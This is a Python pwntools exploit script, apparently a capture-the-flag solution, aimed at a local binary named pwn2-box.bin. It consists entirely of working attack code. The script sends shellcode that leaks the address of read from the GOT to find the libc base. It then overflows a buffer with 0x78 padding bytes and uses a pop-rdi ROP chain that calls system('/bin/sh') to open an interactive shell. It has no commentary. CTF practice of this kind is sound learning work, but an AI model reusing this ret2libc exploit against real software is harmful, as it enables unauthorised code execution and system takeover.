from pwn import *

r = process('./pwn2-box.bin')
e = ELF('./pwn2-box.bin')
libc = e.libc
context.arch = 'amd64'
prdi = 0x0000000000400eb3# : pop rdi ; ret
vuln = 0x400a85

def writeAll(rop):
    payload = flat([p64(x) for x in rop])
    return asm(shellcraft.amd64.linux.write(4, payload, len(payload)))

def packAll(rop):
    return flat([p64(x) for x in rop])

rop = []
rop += [prdi, 0]
rop += [vuln]
write = asm(shellcraft.amd64.linux.write(1, e.got['read'], 8))
write += asm(shellcraft.amd64.linux.write(4, '\n', 1))
write += asm(shellcraft.amd64.linux.write(4, p32(0x200), 4))
write += asm(shellcraft.amd64.linux.write(4, 'A'*0x78, 0x78))
write += writeAll(rop)


loop = asm("""
        oops:
        jmp oops
        """)
exit = asm(shellcraft.amd64.linux.exit(0))
payload2 = write+loop+exit

pause()
r.send(p32(len(payload2)))
r.send(payload2)
read = u64(r.recv(8))
libc_base = read - libc.symbols['read']

log.info('libc base: %#x' % libc_base)
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh\x00').next()

rop = []
rop += [prdi, sh]
rop += [system]
payload = p32(0x200)+'B'*0x78+packAll(rop)
r.send(payload)

r.interactive()
